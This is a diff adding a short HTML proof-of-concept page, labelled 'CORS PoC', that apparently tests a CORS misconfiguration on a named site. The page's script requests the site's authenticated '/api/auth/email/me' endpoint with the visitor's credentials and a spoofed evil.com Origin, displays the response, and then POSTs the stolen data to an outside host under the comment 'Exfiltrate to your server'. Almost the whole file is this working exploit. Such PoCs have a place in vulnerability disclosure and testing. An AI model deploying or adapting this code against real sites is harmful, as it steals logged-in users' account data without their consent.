@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test</title>
+</head>
+<body>
+    <h1>CORS PoC</h1>
+    <div id="result">Loading...</div>
+    
+    <script>
+        fetch('https://jailbreak.bot/api/auth/email/me', {
+            credentials: 'include',
+            headers: {'Origin': 'https://evil.com'}
+        })
+        .then(r => r.json())
+        .then(data => {
+            document.getElementById('result').innerHTML = 
+                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+            
+            // Exfiltrate to your server
+            fetch('https://httpbin.org/post', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            });
+        })
+        .catch(e => {
+            document.getElementById('result').innerHTML = 
+                '<p>Error: ' + e + '</p>';
+        });
+    </script>
+</body>
+</html>
